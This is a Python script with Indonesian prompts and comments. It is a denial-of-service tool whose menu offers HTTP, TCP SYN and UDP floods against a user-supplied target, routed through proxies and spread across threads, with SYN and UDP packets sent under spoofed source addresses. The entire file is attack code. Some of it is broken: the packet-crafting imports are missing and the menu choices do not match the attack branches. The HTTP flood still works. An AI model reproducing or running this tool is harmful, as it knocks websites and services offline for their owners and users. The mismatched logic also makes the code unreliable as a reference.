import requests
import random
import time
import threading

def kirim_data_trafik(url, data, headers=None, proxy=None):
    try:
        proxies = None
        if proxy:
            proxies = {
                "http": f"http://{proxy}",
                "https": f"https://{proxy}",
            }
        response = requests.post(url, data=data, headers=headers, proxies=proxies, timeout=5)
        if response.status_code == 200:
            print(f"\033[96mData terkirim dengan sukses (200) ke {url}\033[0m")
        else:
            print(f"\033[91mError {response.status_code} saat mengirim data ke {url}\033[0m")
    except requests.exceptions.Timeout:
        print(f"\033[91mTimeout terjadi saat mengirim data ke {url}\033[0m")
    except Exception as e:
        print(f"\033[91mError dalam mengirim data: {e}\033[0m")

def tcp_flood(target_ip, target_port, proxy_list, num_requests):
    for _ in range(num_requests):
        if proxy_list:
            proxy = random.choice(proxy_list)
        else:
            proxy = "0.0.0.0"
        sport = random.randint(1024, 65535)
        ip = IP(src=proxy, dst=target_ip)
        syn = TCP(sport=sport, dport=target_port, flags="S")
        packet = ip/syn
        send(packet, verbose=0)
        time.sleep(0.01)

def udp_flood(target_ip, target_port, proxy_list, num_requests):
    for _ in range(num_requests):
        if proxy_list:
            proxy = random.choice(proxy_list)
        else:
            proxy = "0.0.0.0"
        packet = IP(src=proxy, dst=target_ip)/UDP(dport=target_port)/Raw(b"X" * 1024)
        send(packet, verbose=0)
        time.sleep(0.01)

def start_attack_with_threads(target_ip, target_port, proxy_list, num_requests, thread_count, attack_type):
    threads = []
    for _ in range(thread_count):
        if attack_type == 'tcp':
            thread = threading.Thread(target=tcp_flood, args=(target_ip, target_port, proxy_list, num_requests))
        elif attack_type == 'udp':
            thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, proxy_list, num_requests))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def setup_attack(choice, proxy_list):
    url = input("\033[96mMasukkan URL target: \033[0m")
    if not proxy_list and choice in ["1", "2", "3", "4", "5", "6", "7", "8", "9"]:
        print("\033[91mProxy tidak ditemukan atau tidak bisa dimuat. Pastikan file 'proxy.txt' ada!\033[0m")
        return

    num_requests = int(input("\033[96mMasukkan jumlah permintaan yang ingin dikirimkan (contoh: 1000): \033[0m"))
    thread_count = int(input("\033[96mMasukkan jumlah thread untuk serangan: \033[0m"))

    if choice == "1" or choice == "3":
        data = {"trafik": random.randint(1, 100)}
        headers = {"User-Agent": "Mozilla/5.0"}
        for _ in range(num_requests):
            kirim_data_trafik(url, data, headers, random.choice(proxy_list))

    elif choice == "2" or choice == "4":
        data = {"trafik": random.randint(1, 100)}
        headers = {"User-Agent": "Mozilla/5.0"}
        for _ in range(num_requests):
            kirim_data_trafik(url, data, headers)

    elif choice == "5" or choice == "6":
        target_ip = url
        target_port = int(input("\033[96mMasukkan port target: \033[0m"))
        start_attack_with_threads(target_ip, target_port, proxy_list, num_requests, thread_count, 'tcp')

    elif choice == "7" or choice == "8":
        target_ip = url
        target_port = int(input("\033[96mMasukkan port target: \033[0m"))
        start_attack_with_threads(target_ip, target_port, proxy_list, num_requests, thread_count, 'udp')

    elif choice == "9":
        exit()

def load_proxies(file_name="proxy.txt"):
    proxies = []
    try:
        with open(file_name, "r") as file:
            proxies = [line.strip() for line in file.readlines()]
        print("\033[96mProxies berhasil dimuat.\033[0m")
    except FileNotFoundError:
        print(f"\033[91mFile {file_name} tidak ditemukan.\033[0m")
    return proxies

def menu():
    print("==========================================")
    print("\n\033[96mPilih jenis serangan:\033[0m")
    print("==========================================")
    print("\033[96m1. - HTTP Flood (Dengan Proxy)\033[0m")
    print("\033[96m2. - HTTP Flood (Tanpa Proxy)\033[0m")
    print("\033[96m3. - TCP Flood  (Dengan Proxy)\033[0m")
    print("\033[96m4. - TCP Flood  (Tanpa Proxy)\033[0m")
    print("\033[96m5. - UDP Flood  (Dengan Proxy)\033[0m")
    print("\033[96m6. - UDP Flood  (Tanpa Proxy)\033[0m")
    print("\033[96m7. - Keluar\033[0m")
    print("==========================================")

def main():
    proxy_list = load_proxies()
    while True:
        menu()
        pilihan = input("\033[96mPilih: \033[0m")

        if pilihan in ["1", "2", "3", "4", "5", "6"]:
            setup_attack(pilihan, proxy_list)

        elif pilihan == "7":
            print("\033[91mKeluar dari program...\033[0m")
            break
        else:
            print("\033[91mPilihan tidak valid. Silakan coba lagi.\033[0m")

if __name__ == "__main__":
    main()
